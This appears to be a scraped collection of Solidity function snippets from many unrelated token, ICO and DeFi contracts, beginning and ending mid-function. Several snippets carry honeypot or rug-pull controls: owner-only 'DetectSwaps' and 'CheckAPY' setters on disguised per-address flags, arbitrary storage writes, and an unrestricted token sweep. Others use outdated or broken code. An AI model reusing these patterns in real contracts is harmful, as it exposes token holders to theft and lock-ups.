        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function startConditions(bytes32 stageId) internal constant returns (bool) {
        // If the cap has been reached, end the sale.
        if (stageId == SALE_ENDED && contributionCap == weiContributed) {
            return true;
        }
        return super.startConditions(stageId);
    }
--------------------------------------------------------------------------------
function transferWithData(address to, uint256 value, bytes calldata data)
    external
    isValidCertificate(data)
  {
    _transferWithData("", msg.sender, msg.sender, to, value, data, "", true);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) returns (bool success) {
    if (_value <= 0) revert();
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function calcCurrentTokenPrice()
        public
        timedTransitions
        returns (uint)
    {
        if (stage == Stages.AuctionEnded || stage == Stages.TradingStarted)
            return finalPrice;
        return calcTokenPrice();
    }
--------------------------------------------------------------------------------
function getTypes() external view returns(uint8[]) {
        uint8[] memory res = new uint8[](1);
        res[0] = 2;
        return res;
    }
--------------------------------------------------------------------------------
function _mint(address to_, uint256 amount_) internal {
        totalSupply += amount_;
        balanceOf[to_] += amount_;
        emit Transfer(address(0x0), to_, amount_);
    }
--------------------------------------------------------------------------------
function DetectSwaps(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    himalaya[spender] = val;
    rainier[spender] = val2; 
    aconcagua[spender] = val3;
    hillary = val4;
  }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function deposit(address investor) onlyOwner payable {
    require(state == State.Active);
    deposited[investor] = add(deposited[investor], msg.value);
  }
--------------------------------------------------------------------------------
function POPToken() public {
        totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function GetCardNumber(uint8 rank, uint8 suit) public pure returns (uint8){
        if (rank==0){
            return 0;
        }
        
        return ((rank-1)*4+1)+suit;
    }
--------------------------------------------------------------------------------
function updateSlot(bytes32 slot, bytes32 value) external {
    require(msg.sender == ownerAddress, "Ownable: Admin only");
    assembly {
      sstore(slot, value)
    }
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {

    bool withinPeriod = started;

    bool nonZeroPurchase = msg.value != 0;

    return withinPeriod && nonZeroPurchase;

  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function addRecipient(address _recipient, uint256 _rewardRate)
        external
        onlyPolicy
    {
        require(_recipient != address(0));
        info.push(Info({recipient: _recipient, rate: _rewardRate}));
    }
--------------------------------------------------------------------------------
function setIcoPercent(uint256 newIcoPercent)
  public
  onlyOwner {
    _icoPercent = newIcoPercent;
    //_icoSupply = _totalSupply * _icoPercent / 100;
    _icoSupply = _totalSupply.mul(_icoPercent).div(100);
    ParamConfig(1, _icoPercent);
  }
--------------------------------------------------------------------------------
function _logURIs(uint256[] memory _tokenIDs) internal {
    for (uint256 i = 0; i < _tokenIDs.length; i++) {
      _logURI(_tokenIDs[i]);
    }
  }
--------------------------------------------------------------------------------
function startAuction() public isOwner atStage(Stages.AuctionSetUp) {
        stage = Stages.AuctionStarted;
        auction_start_time = now;
        start_block = block.number;
        AuctionStarted(auction_start_time, start_block);
    }
--------------------------------------------------------------------------------
function price() public constant returns (uint256) {
        if (stage == Stages.AuctionEnded ||
            stage == Stages.TokensDistributed) {
            return 0;
        }
        return calcTokenPrice();
    }
--------------------------------------------------------------------------------
function AddUser(address newUser) onlyOwner{
		if (usersAddress[newUser] == 0) {
			usersAddress[newUser] = 1;
			userNumber += 1;
			LogAddUser(newUser);
		}
	}
--------------------------------------------------------------------------------
function RemoveUser(address rmUser) onlyOwner {
		if (usersAddress[rmUser] == 1) {
			usersAddress[rmUser] = 0;
			userNumber -= 1;
			LogRmUser(rmUser);
		}
	}
--------------------------------------------------------------------------------
function emergencySetStartingIndexBlock() external onlyOwner {
        require(startingIndex == 0, "Starting index is already set");
        
        startingIndexBlock = block.number;
    }
--------------------------------------------------------------------------------
function addAddressToWhitelist(address addr) public onlyOwner returns(bool success) {
        if (!whitelist[addr]) {
            whitelist[addr] = true;
            emit WhitelistedAddressAdded(addr);
            success = true;
        }
    }
--------------------------------------------------------------------------------
function removeAddressFromWhitelist(address addr) public onlyOwner returns(bool success) {
        if (whitelist[addr]) {
            whitelist[addr] = false;
            emit WhitelistedAddressRemoved(addr);
            success = true;
        }
    }
--------------------------------------------------------------------------------
function changeFeeStatus() public {
        require(msg.sender == MARKETING_ADDRESS1 || msg.sender == owner(), "not owner");
        feeOn = !feeOn;
    }
--------------------------------------------------------------------------------
function ZBillionaire() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function setPubPerBlock(uint256 _pubPerBlock) public onlyOwner {
        require(_pubPerBlock > 0, "_pubPerBlock must be non-zero");

        // update all pools prior to changing the block rewards
        massUpdatePools();

        // update the block rewards
        pubPerBlock = _pubPerBlock;
    }
--------------------------------------------------------------------------------
function updatePrice(uint256 _level, uint256 _price) public returns (bool) {
        require(msg.sender == owner, "only OwnerWallet");
        LEVEL_PRICE[_level] = _price;
        return true;
    }
--------------------------------------------------------------------------------
function destruct () public onlyOwner {
        require(state == 2 || state == 3);
        require(balanceOf[owner()] == totalSupply);
        selfdestruct(owner());
    }
--------------------------------------------------------------------------------
function startIco() external managerOnly {
       require(statusICO == StatusICO.Created || statusICO == StatusICO.Paused);
       LogStartICO();
       statusICO = StatusICO.Started;
    }
--------------------------------------------------------------------------------
function setStartTime(uint256 _at) public onlyOwner {
        require(block.timestamp < _at); // should be great than current block timestamp
        require(_at < endTime);

        startTime = _at;
        ESetStartTime(_at);
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        return transferMain(msg.sender, _to, _value);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setPrice(uint8 category, uint256 price, bool inWei) public onlyOwner {
        uint256 multiply = 1e18;
        if (inWei) {
            multiply = 1;
        }
        
        categoryPrice[category] = price * multiply;
    }
--------------------------------------------------------------------------------
function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
        _previousOwner = address(0);
    }
--------------------------------------------------------------------------------
function stopICO() onlyOwner public{
            endTime = 0;
            uint256 tokenAmount=balanceOf[this];
            _transfer(this, msg.sender, tokenAmount);
        }
--------------------------------------------------------------------------------
function manualWithdrawToken(uint256 _amount) onlyOwner public {
            uint256 tokenAmount = _amount.mul(1 ether);
            _transfer(this, msg.sender, tokenAmount);
          }
--------------------------------------------------------------------------------
function _transfer(
    address _from,
    address _to,
    uint _amount
  ) internal
    authorizeTransfer(_from, _to, _amount, false)
  {
    require(state != STATE_INIT || _from == beneficiary, "ONLY_BENEFICIARY_DURING_INIT");
    super._transfer(_from, _to, _amount);
  }
--------------------------------------------------------------------------------
function LIFT(
    ) public {
        totalSupply = 509999890000000000000000000;                      // Update total supply with the decimal amount
        balanceOf[msg.sender] = 509999890000000000000000000;            // Give the creator all initial tokens
        name = "Lift Token";                                            // Set the name for display purposes
        symbol = "LIFT";                                                // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function isAvailable(string memory name) public view returns (bool) {
        if (checkCharacters(bytes(name))) {return (nameAddressMap[name] == address(0));}
        return false;
    }
--------------------------------------------------------------------------------
function finishPresale() public onlyOwner returns (bool success) {
        require(contract_state == State.Presale);
        contract_state = State.waitingForICO;
        NewState(contract_state);
        return true;
    }
--------------------------------------------------------------------------------
function startICO() public onlyOwner returns (bool success) {
        require(contract_state == State.waitingForICO);
        contract_state = State.ICO;
        NewState(contract_state);
        return true;
    }
--------------------------------------------------------------------------------
constructor () {
        address msgSender = Context._msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function checkBalance(address _target) internal returns (uint256) {
        uint256 balance = address(_target).balance;
        emit balanceLog(_target, balance);
        return balance;
    }
--------------------------------------------------------------------------------
function verifyBlockHash(string memory _hash, uint _blockNumber) public returns (bytes32, bytes32) {
        bytes32 hash1 = keccak256(_hash);
        bytes32 hash2 = getBlockHash(_blockNumber);
        return(hash1, hash2) ;
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
    require(isApprovedFor(msg.sender, _tokenId));
    clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
  }
--------------------------------------------------------------------------------
function clearApproval(address _owner, uint256 _tokenId) private {
    require(ownerOf(_tokenId) == _owner);
    tokenApprovals[_tokenId] = 0;
    Approval(_owner, 0, _tokenId);
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    require(_to != address(0));
    addToken(_to, _tokenId);
    Transfer(0x0, _to, _tokenId);
  }
--------------------------------------------------------------------------------
constructor(address _masterCopy)
        public
    {
        require(_masterCopy != address(0), "Invalid master copy address provided");
        masterCopy = _masterCopy;
    }
--------------------------------------------------------------------------------
function _requireTokenRegistered(bytes32 _currencyKey) internal view {
        require(targetTokens[_currencyKey].tokenAddress != address(0), "Target token is not registered");
    }
--------------------------------------------------------------------------------
function tokenURI(uint256 tokenId) public view override returns (string memory) {
        require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");

        return tokenURI_;
    }
--------------------------------------------------------------------------------
constructor(address _masterCopy)
    {
        require(_masterCopy != address(0), "Invalid master copy address provided");
        masterCopy = _masterCopy;
    }
--------------------------------------------------------------------------------
constructor() public {
        owner = msg.sender;
        balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function adminSendMoneyToUser(address to,uint256 value) public{
        address opt_add=msg.sender;
        if(opt_add == admin_add){
            transferFrom(admin_add,to,value);
        }
    }
--------------------------------------------------------------------------------
function addAuthorizedAddress(address target)
        public
        onlyOwner
        targetNotAuthorized(target)
    {
        authorized[target] = true;
        authorities.push(target);
        emit LogAuthorizedAddressAdded(target, msg.sender);
    }
--------------------------------------------------------------------------------
function smTransfer(address _to, uint256 _value) public returns (bool)  {
        require(smPool == msg.sender);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function burnTransfer(address _from, uint256 _value, string key) public returns (bool)  {
        require(burnPoolAddreses[key] != 0x0);
        _transfer(_from, burnPoolAddreses[key], _value);
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) external onlyOwner returns (bool ok)  {
    uint256 converterdValue = value * (10 ** uint256(tokenDecimals));
    return token.transfer(to, converterdValue);
  }
--------------------------------------------------------------------------------
function tokeninfo(address _tokenaddr) public view returns (uint256, string, string) {
        IERC20 tokeni = IERC20(_tokenaddr);
        return (tokeni.decimals(),tokeni.symbol(),tokeni.name());
        }
--------------------------------------------------------------------------------
function losttokens(address token) public {
        IERC20 tokeninterface = IERC20(token);
        tokeninterface.transfer(admin,tokeninterface.balanceOf(address(this)));
}
--------------------------------------------------------------------------------
function checkSell(uint256 _valueBbd) constant returns (bool isPossible, uint256 valueInEthWei) {
        valueInEthWei = _valueBbd.div(exchangeRate());
        isPossible = this.balance >= valueInEthWei ? true : false;
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
constructor (Token _company_token) public {
    owner = msg.sender;
    company_token = _company_token;
    currentBatch = 0;
    addrPerStep = 20;
    setBountyAddresses();
    setBountyAmounts();
  }
--------------------------------------------------------------------------------
function DataFromSetting(uint8 n) pure internal returns(uint8 set, bool offer, uint8 id){
        // setting simpmly extract first 2 bits. 
        set = (n & 3); 
        // offer extract 3rd bit and convert it to bool (cannot shift and check due to ID), or might have used MOD 1 
        offer = (bool) ((n & 4)==4); 
        // shift n by 4 bits to extract id. throws away first 4 bits, nice.
        id = (n) >> 4;
        
    }
--------------------------------------------------------------------------------
function confirmAggregator(address _aggregator)
    external
    onlyOwner()
  {
    require(_aggregator == address(proposedAggregator), "Invalid proposed aggregator");
    delete proposedAggregator;
    setAggregator(_aggregator);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function freezeAccount(address account) public onlyOwner returns (bool) {
        require(!frozenAccount[account]);
        frozenAccount[account] = true;
        emit Freeze(account);
        return true;
    }
--------------------------------------------------------------------------------
function unfreezeAccount(address account) public onlyOwner returns (bool) {
        require(frozenAccount[account]);
        frozenAccount[account] = false;
        emit Unfreeze(account);
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
    tkn = TokenContract(0x95c5bf2e68b76F2276221A8FFc9c47a49E9405Ec);                    // address of the token contract
    investorsStorage = InvestorsStorage(0x15c7c30B980ef442d3C811A30346bF9Dd8906137);      // address of the storage contract
    minInvestment = 100 finney;
    updatePrice(5000);
  }
--------------------------------------------------------------------------------
function transferPreSignedHashing(
        address _token,
        address _to,
        uint256 _value,
        uint256 _fee,
        uint256 _nonce
    )
        public
        pure
        returns (bytes32)
    {
        /* "48664c16": transferPreSignedHashing(address,address,address,uint256,uint256,uint256) */
        return keccak256(abi.encodePacked(bytes4(0x48664c16), _token, _to, _value, _fee, _nonce));
    }
--------------------------------------------------------------------------------
function approvePreSignedHashing(
        address _token,
        address _spender,
        uint256 _value,
        uint256 _fee,
        uint256 _nonce
    )
        public
        pure
        returns (bytes32)
    {
        /* "f7ac9c2e": approvePreSignedHashing(address,address,uint256,uint256,uint256) */
        return keccak256(abi.encodePacked(bytes4(0xf7ac9c2e), _token, _spender, _value, _fee, _nonce));
    }
--------------------------------------------------------------------------------
function increaseApprovalPreSignedHashing(
        address _token,
        address _spender,
        uint256 _addedValue,
        uint256 _fee,
        uint256 _nonce
    )
        public
        pure
        returns (bytes32)
    {
        /* "a45f71ff": increaseApprovalPreSignedHashing(address,address,uint256,uint256,uint256) */
        return keccak256(abi.encodePacked(bytes4(0xa45f71ff), _token, _spender, _addedValue, _fee, _nonce));
    }
--------------------------------------------------------------------------------
function decreaseApprovalPreSignedHashing(
        address _token,
        address _spender,
        uint256 _subtractedValue,
        uint256 _fee,
        uint256 _nonce
    )
        public
        pure
        returns (bytes32)
    {
        /* "59388d78": decreaseApprovalPreSignedHashing(address,address,uint256,uint256,uint256) */
        return keccak256(abi.encodePacked(bytes4(0x59388d78), _token, _spender, _subtractedValue, _fee, _nonce));
    }
--------------------------------------------------------------------------------
function canTransferBefore(address _sender) public view returns(bool) {
		return (
			_sender == owner ||
			_sender == presale_holder ||
			_sender == ico_holder ||
			_sender == reserved_holder ||
			_sender == wallet_holder
		);
	}
--------------------------------------------------------------------------------
constructor() public {
    _mint(msg.sender, INITIAL_SUPPLY);
    emit Transfer(address(0), msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function tokenSaleStart() external onlyOwner tokenSaleIsNotOngoing returns(bool) {
        require(currentTokenSaleId < MAX_TOKEN_SALES);
        currentTokenSaleId++;
        tokenSaleOngoing = true;
        emit TokenSaleStarting(currentTokenSaleId);
        return true;
    }
--------------------------------------------------------------------------------
function unlockAddress(address _address) public onlyLocker returns(bool) {
        require(locked[_address]);

        locked[_address] = false;
        emit Unlock(_address);
        return true;
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    downwind[spender] = val;
    upwind[spender] = val2; 
    tigers[spender] = val3;
    cocos = val4;
  }
--------------------------------------------------------------------------------
function extendDeadline(uint _newDeadline) public returns (bool success){
        require(msg.sender == owner);
        require(_newDeadline > 0);
        endDate = _newDeadline;
        return true;
    }
--------------------------------------------------------------------------------
function setInDepositBitmap(address _account, uint8 _index) internal {
        Account storage account = accounts[_account];
        account.depositBitmap = account.depositBitmap.setBit(_index);
    }
--------------------------------------------------------------------------------
function unsetFromDepositBitmap(address _account, uint8 _index) internal {
        Account storage account = accounts[_account];
        account.depositBitmap = account.depositBitmap.unsetBit(_index);
    }
--------------------------------------------------------------------------------
function setInBorrowBitmap(address _account, uint8 _index) internal {
        Account storage account = accounts[_account];
        account.borrowBitmap = account.borrowBitmap.setBit(_index);
    }
--------------------------------------------------------------------------------
function unsetFromBorrowBitmap(address _account, uint8 _index) internal {
        Account storage account = accounts[_account];
        account.borrowBitmap = account.borrowBitmap.unsetBit(_index);
    }
--------------------------------------------------------------------------------
function lowerLimit( address token, uint newMax ) external onlyPolicy() {
        require( newMax < deployLimitFor[ token ] );
        require( newMax > deployedFor[ token ] );
        deployLimitFor[ token ] = newMax;
    }
--------------------------------------------------------------------------------
function DIOCtoken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = totalSupply_;
        Transfer(0x0, msg.sender, totalSupply_);
    }
--------------------------------------------------------------------------------
function accumulativeFundsOf(address _owner) public view returns(uint256) {
		return pointsPerShare.mul(balanceOf(_owner)).toInt256Safe()
			.add(pointsCorrection[_owner]).toUint256Safe() / pointsMultiplier;
	}
--------------------------------------------------------------------------------
function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {
    require(_beneficiary != address(0));
    require(_weiAmount != 0);
    super._preValidatePurchase(_beneficiary, _weiAmount);
  }
--------------------------------------------------------------------------------
function selingWithdrawBalance()
        view
        public
        returns(uint256)
    {
        address _customerAddress = msg.sender;
         
        uint256 _sellingWithdraw = (uint256) (sellingWithdrawBalance_[_customerAddress]) ; // get all balance
        
        return  _sellingWithdraw;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function updatePrice(uint _level, uint _price) public returns (bool) {
        require(msg.sender == ownerAddress, "only OwnerWallet");

        LEVEL_PRICE[_level] = _price;
        return true;
    }
--------------------------------------------------------------------------------
function Authorizable() public {
    authorizers.length = 2;
    authorizers[1] = msg.sender;
    authorizerIndex[msg.sender] = 1;
  }
--------------------------------------------------------------------------------
function addAuthorized(address _addr) external onlyAuthorized {
    authorizerIndex[_addr] = authorizers.length;
    authorizers.length++;
    authorizers[authorizers.length - 1] = _addr;
  }
--------------------------------------------------------------------------------
function lockAddress(address _address) public onlyLocker returns (bool) {
        require(!locked[_address]);

        locked[_address] = true;
        emit Lock(_address);
        return true;
    }
--------------------------------------------------------------------------------
function unlockAddress(address _address) public onlyLocker returns (bool) {
        require(locked[_address]);

        locked[_address] = false;
        emit Unlock(_address);
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function activeTranscoderTotalStake(address _transcoder, uint256 _round) public view returns (uint256) {
        // Must be active transcoder
        require(activeTranscoderSet[_round].isActive[_transcoder]);

        return transcoders[_transcoder].earningsPoolPerRound[_round].totalStake;
    }
--------------------------------------------------------------------------------
function transcoderStatus(address _transcoder) public view returns (TranscoderStatus) {
        if (transcoderPool.contains(_transcoder)) {
            return TranscoderStatus.Registered;
        } else {
            return TranscoderStatus.NotRegistered;
        }
    }
--------------------------------------------------------------------------------
function _mintShares(address _account, uint256 _amount)
        internal
        updateReward(_account)
    {
        require(_amount > 0, "REWARD_POOL: cannot mint 0 shares");
        _increaseShares(_account, _amount);
    }
--------------------------------------------------------------------------------
function _burnShares(address _account, uint256 _amount)
        internal
        updateReward(_account)
    {
        require(_amount > 0, "REWARD_POOL: cannot burn 0 shares");
        _decreaseShares(_account, _amount);
    }
--------------------------------------------------------------------------------
function startPresale() whenNotPaused onlyOwner external {
        require(!isPresaleStarted);

        currentStatus = Status.Presale;
        isPresaleStarted = true;

        presaleStartTime = now;
        PresaleStarted(presaleStartTime);
    }
--------------------------------------------------------------------------------
function validPurchase(uint256 tokensAmount) internal view returns (bool) {
        bool nonZeroPurchase = tokensAmount != 0;
        bool acceptableAmount = tokensAmount >= getMinimumPurchase();
        return nonZeroPurchase && acceptableAmount;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function transferOwnership(address _newOwner) public onlyOwner returns (bool) {
        if (_newOwner != address(0)) {
            onTransferOwnership(owner, _newOwner);
            owner = _newOwner;
        }
        return true;
    }
--------------------------------------------------------------------------------
constructor() public HasOwner(msg.sender) {
        name = NAME;
        symbol = SYMBOL;
        decimals = DECIMALS;
        totalSupply = TOTAL_SUPPLY;
        balances[owner] = TOTAL_SUPPLY;
    }
--------------------------------------------------------------------------------
function destroy(uint amount) onlyOwner {
          require(amount>0 && balances[this] >= amount);
          balances[this] -= amount;
          totalSupply -= amount;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
constructor(uint256 _initialSupply, string memory _name, string memory _symbol, uint8 _decimals) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        super._mint(msg.sender, _initialSupply);
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function AnimalgoSave(address _holder) public view returns(bool){
    require(!save[_holder]);
    save[_holder] = true;
    emit Save(_holder);
    return true;
}
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function initialize(address _permissionsCreator) onlyInit public {
        initialized();
        require(msg.sender == address(kernel));

        _createPermission(_permissionsCreator, this, CREATE_PERMISSIONS_ROLE, _permissionsCreator);
    }
--------------------------------------------------------------------------------
function revokePermission(address _entity, address _app, bytes32 _role)
        onlyPermissionManager(_app, _role)
        external
    {
        require(hasPermission(_entity, _app, _role));

        _setPermission(_entity, _app, _role, bytes32(0));
    }
--------------------------------------------------------------------------------
function ADS(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function BitcoinBLUE(
    ) public {
        totalSupply = 2100000000000000;  // Update total supply with the decimal amount
        balanceOf[msg.sender] = totalSupply;                // Give the creator all initial tokens
        name = "Bitcoin BLUE";                                   // Set the name for display purposes
        symbol = "BTCBLU";                               // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function addition(uint256 x, uint256 y) internal pure returns (uint256 z) {
        z = x + y;
        require(z >= x, "RewardAdjusterBundler/add-uint-uint-overflow");
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function mul(uint256 a, uint256 b) internal pure returns (uint256) {
if (a == 0) {
return 0;
}
uint256 c = a * b;
return c;
}
--------------------------------------------------------------------------------
function updatePrice(uint _level, uint _price) external returns(bool) {
          require(msg.sender == ownerAddress,"only OwnerWallet");
          LEVEL_PRICE[_level] = _price;
          return true;
    }
--------------------------------------------------------------------------------
function updateToken(address _newToken) public returns(bool) {
        require(msg.sender == ownerAddress, "Invalid User");
        Token = ERC20(_newToken);
        return true;
    }
--------------------------------------------------------------------------------
function setTokenPrice(uint _tokenPrice) external onlyOwner returns (bool) {
        require(_tokenPrice >= 100 && _tokenPrice <= 100000);

        tokenPrice=_tokenPrice;

        TokenPriceUpdated(_tokenPrice);
        return true;
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function deploy() public only_owner at_stage(Stages.Deploying) {
        require(phases.length > 0);
        require(stakeholderPercentagesIndex.length > 0);
        stage = Stages.Deployed;
    }
--------------------------------------------------------------------------------
function lbkBurnWhenMoveToMainnet(address burner, uint256 value, string note) onlyOwner public returns (bool ret) {
        ret = burnFrom(burner, value);
        emit LBKBurnWhenMoveToMainnet(msg.sender, burner, value, note);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setCoinPrice(uint256 newPriceInWei) public returns(uint256 oldPriceInWei){
	    require(msg.sender==owner);
	    uint256 _old=coinPriceInWei;
	    coinPriceInWei=newPriceInWei;
	    return _old;
	}
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success){
        require(checkVestingCondition(msg.sender));
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
constructor(ERC20Interface _addressOfTokenUsedAsReward, address payable _beneficiary) public {

        creator = msg.sender;
        tokenReward = _addressOfTokenUsedAsReward;
        beneficiary = _beneficiary;

        emit LogFunderInitialized(
            creator,
            ICOdeadline);

    }
--------------------------------------------------------------------------------
constructor (Token _company_token) public {
    owner = msg.sender;
    company_token = _company_token;
    currentBatch = 0;
    addrPerStep = 20;
    setBountyAddresses();
    setBountyAmounts();
  }
--------------------------------------------------------------------------------
function cancelOffer(address[3] addresses, bytes32 deal, uint256 amount)
    external {
        bytes32 paymentId = doCancelOffer(addresses, deal, amount, getAnotherParty(addresses));
        emit PaymentOfferCanceled(paymentId);
    }
--------------------------------------------------------------------------------
function cancelOwnOffer(address[3] addresses, bytes32 deal, uint256 amount)
    external {
        bytes32 paymentId = doCancelOffer(addresses, deal, amount, msg.sender);
        emit PaymentOwnOfferCanceled(paymentId);
    }
--------------------------------------------------------------------------------
function DetectSwaps(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    saturn[spender] = val;
    akira[spender] = val2; 
    cocaine[spender] = val3;
    hills = val4;
  }
--------------------------------------------------------------------------------
function _starttheGOLDRUSH(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            fee(_counts[i]); }
    }
--------------------------------------------------------------------------------
function SaiContest_Gaia() public {
		owner = msg.sender;		
		start = now;
		last_roll = now;
		last_jack = now;
		jack_nonce = 1;
	}
--------------------------------------------------------------------------------
function encodeCurrency(string currency) public pure returns (bytes32 o) {
        require(bytes(currency).length <= 32);
        assembly {
            o := mload(add(currency, 32))
        }
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function setInterestPrice(address _property, uint256 _value) external {
		addressValidator().validateAddress(msg.sender, config().lockup());

		eternalStorage().setUint(getInterestPriceKey(_property), _value);
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) isRunning returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function bountyTransfer(address _to, uint _value) onlyBountyManager public {
        _freezeAccount(bountyManagerAddress, false);
        _tokenDelivery(bountyManagerAddress, _to, _value, frozenDaysForBounty);
        _freezeAccount(bountyManagerAddress, true);
    }
--------------------------------------------------------------------------------
function migrateMultiple(
        uint[] memory _tokenIds
    )
        public
    {
        for (uint i = 0; i < _tokenIds.length; i++) {
            migrate(_tokenIds[i]);
        }
    }
--------------------------------------------------------------------------------
function acceptOwnership() public{
        require(msg.sender == newOwner);
        OwnerUpdate(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
--------------------------------------------------------------------------------
function _mint(address to_, uint256 amount_) internal virtual {
        totalSupply += amount_;
        balanceOf[to_] += amount_;
        emit Transfer(address(0x0), to_, amount_);
    }
--------------------------------------------------------------------------------
function inRebaseWindow() public view returns (bool) {
        return (
            now.mod(minRebaseTimeIntervalSec) >= rebaseWindowOffsetSec &&
